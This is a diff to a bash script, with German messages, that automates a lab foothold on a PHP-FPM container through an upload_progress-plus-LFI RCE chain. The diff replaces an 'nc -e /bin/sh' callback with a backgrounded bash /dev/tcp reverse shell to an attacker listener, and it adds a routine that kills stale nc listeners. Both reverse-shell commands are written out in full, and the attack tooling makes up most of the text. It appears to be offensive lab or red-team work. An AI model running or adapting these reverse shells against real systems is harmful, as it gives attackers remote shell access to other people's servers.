@@ -1,7 +1,7 @@
 # shellcheck shell=bash
-# Lab foothold: Chain-A RCE (upload_progress + LFI) on the FPM target → nc back
-# to the engage listener. Uses `docker run --network <target-net>` so it works
-# regardless of compose project naming (p2s vs folder name).
+# Lab foothold: Chain-A RCE (upload_progress + LFI) on the FPM target → reverse shell
+# back to the engage listener. Uses bash /dev/tcp (no nc on target) or python fallback.
+# Runs attacker one-shot on the target's actual Docker network.
 
 engage_lab_foothold_container() {
   printf '%s' "${ENGAGE_LAB_TARGET_CONTAINER:-vtbw-php2shell-target}"
@@ -9,6 +9,20 @@ engage_lab_foothold_container() {
 
 engage_lab_foothold_attacker_image() {
   printf '%s' "${ENGAGE_LAB_ATTACKER_IMAGE:-php2shell-unchained-attacker:latest}"
+}
+
+# Drop leftover nc/ncat binds (SO_REUSEPORT) so the new listener is the only one.
+engage_reclaim_listen_port() {
+  local port="$1" pid comm
+  [[ "$port" =~ ^[0-9]+$ ]] || return 0
+  while read -r pid; do
+    [[ -z "$pid" ]] && continue
+    comm="$(ps -p "$pid" -o comm= 2>/dev/null || true)"
+    case "$comm" in
+      nc|ncat|netcat) kill "$pid" 2>/dev/null || true ;;
+    esac
+  done < <(ss -H -tlnp "sport = :$port" 2>/dev/null | grep -oE 'pid=[0-9]+' | cut -d= -f2 | sort -u)
+  sleep 0.2
 }
 
 engage_lab_foothold_supported() {
@@ -28,8 +42,10 @@ engage_lab_foothold_exec_rce() {
   local img; img="$(engage_lab_foothold_attacker_image)"
   docker image inspect "$img" >/dev/null 2>&1 || { echo "[foothold-lab] FEHLER: Image $img fehlt — vtbw-php2shell-lab up" >&2; return 1; }
 
+  # Use bash /dev/tcp reverse shell (nc is not installed in the php-fpm image).
   local script="/tmp/p2s-foothold-$$.sh"
-  docker exec "$c" bash -c "printf '%s\n' 'nc ${lhost} ${lport} -e /bin/sh' > '$script' && chmod 755 '$script'" || return 1
+  # Background: PHP system() must return; the shell stays on the socket.
+  docker exec "$c" bash -c "printf '%s\n' 'setsid bash -c \"bash -i >& /dev/tcp/${lhost}/${lport} 0>&1\" </dev/null >/tmp/p2s-rs.log 2>&1 &' > '$script' && chmod 755 '$script'" || return 1
   echo "[foothold-lab] RCE one-shot auf Netz: $net (Image: $img)"
   docker run --rm --network "$net" \
     -v "$LAB_ROOT/attacker/scripts:/opt/lab/scripts:ro" \
@@ -40,8 +56,8 @@ engage_lab_foothold_exec_rce() {
 
 engage_lab_foothold_note() {
   cat <<'NOTE'
-[foothold-lab] RCE-Kette (session.upload_progress + LFI) → Ziel führt `nc` zum Listener aus.
-  Erwartung: Fenster **listener** im tmux zeigt connect + `whoami`.
-  Kein Connect: Port blockiert? Lab-Bridge-GW falsch? → ENGAGE_LAB_BRIDGE_GW=… überschreiben.
+[foothold-lab] RCE-Kette (session.upload_progress + LFI) → Ziel führt bash /dev/tcp Reverse-Shell aus.
+  Erwartung: Fenster **listener** im tmux zeigt connect + Prompt (www-data).
+  Kein Connect: Prüfe `docker logs vtbw-php2shell-target` nach dem RCE-Lauf.
 NOTE
 }
